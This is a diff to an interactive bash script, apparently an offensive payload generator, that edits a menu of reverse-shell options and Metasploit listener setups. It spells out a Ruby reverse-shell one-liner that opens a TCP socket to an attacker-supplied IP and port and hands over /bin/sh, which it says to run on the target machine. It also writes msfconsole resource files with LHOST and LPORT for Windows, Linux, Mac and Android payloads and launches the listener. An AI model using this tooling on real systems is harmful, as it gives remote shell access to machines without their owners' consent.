@@ -164,9 +164,9 @@ echo ${YELLOW}"
    echo "	  |---------------------------------------------|"
    echo "	  |    📈${GREEN} 5 ${BLUE}PHP shell script.                   ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🌸${GREEN} 6 ${BLUE}Ruby shell script.                  ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🐱${GREEN} 7 ${BLUE}Netcat shell script.                ${YELLOW}|"
+#   echo "	  |    🌸${GREEN} 6 ${BLUE}Ruby shell script.                  ${YELLOW}|"
+#   echo "	  |---------------------------------------------|"
+   echo "	  |    🐱${GREEN} 6 ${BLUE}Netcat shell script.                ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|"
@@ -260,15 +260,7 @@ echo ${YELLOW}"
 	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
             goto shelly;
 	  ;; 
-	6)
-	    touch shell.rb
-	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
-	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
-	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
-            goto shelly;
-	 ;;					    
-	 7) 
+	 6) 
 	    touch $wdir/netcat.sh
             echo
             echo "              ${FGC} Crafting a Netcat Shell script   :   ${NC}${YELLOW}"
@@ -326,6 +318,14 @@ echo ${YELLOW}"
 	    pause  '          '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
 	    goto shelly;
 	  ;;
+#	7)
+#	    touch shell.rb
+#	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
+#	    echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > shell.rb
+#	    echo -e "${DG} - - - -> Ruby Shell script saved to $wdir/shell.rb"${GREEN}
+#	    echo -e "or run ${LIGHT_CYAN}ruby -rsocket -e'f=TCPSocket.open(\"$attackerip\",$attackerport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${GREEN} on the target machine"
+#          goto shelly;
+#	 ;;					    
          q)
 	    clear
 	    goto $start
@@ -633,8 +633,7 @@ listeners()
             echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
             read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
-#            echo set ExitOnSession false >> $wdir/meterpreter_windows.rc
-            echo run -j -z >> $wdir/meterpreter_windows.rc
+            echo run >> $wdir/meterpreter_windows.rc
             echo
 	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_windows.rc."
 	    echo "${GREEN}            ---> Finished crafting listener."
@@ -655,15 +654,14 @@ listeners()
             echo set LHOST $attackerip >> $wdir/meterpreter_linux.rc
             read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_linux.rc
-            echo set ExitOnSession false >> $wdir/meterpreter_linux.rc
-            echo exploit -j -z >> $wdir/meterpreter_linux.rc
+            echo run >> $wdir/meterpreter_linux.rc
             echo
 	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_linux.rc."
 	    echo "${GREEN}            ---> Finished crafting listener."
 	    sleep 1
 	    echo
 	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
-            cat $wdir/meterpreter_linux.rc | 
+            cat $wdir/meterpreter_linux.rc | xterm -e msfconsole -r $wdir/meterpreter_linux.rc
 	    sleep 2
             goto listen;
             ;;
@@ -677,8 +675,7 @@ listeners()
             echo set LHOST $attackerip >> $wdir/meterpreter_mac.rc
             read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_mac.rc
-            echo set ExitOnSession false >> $wdir/meterpreter_mac.rc
-            echo exploit -j -z >> $wdir/meterpreter_mac.rc
+            echo run >> $wdir/meterpreter_mac.rc
             echo
 	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_mac.rc."
 	    echo "${GREEN}            ---> Finished crafting listener."
@@ -699,8 +696,7 @@ listeners()
             echo set LHOST $attackerip >> $wdir/meterpreter_droid.rc
             read -p '	    Set Attacker Port* ' attackerport
             echo set LPORT $attackerport >> $wdir/meterpreter_droid.rc
-            echo set ExitOnSession false >> $wdir/meterpreter_droid.rc
-            echo exploit -j -z >> $wdir/meterpreter_droid.rc
+            echo run >> $wdir/meterpreter_droid.rc
 	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_droid.rc."
 	    echo "${GREEN}            ---> Finished crafting listener."
 	    sleep 1
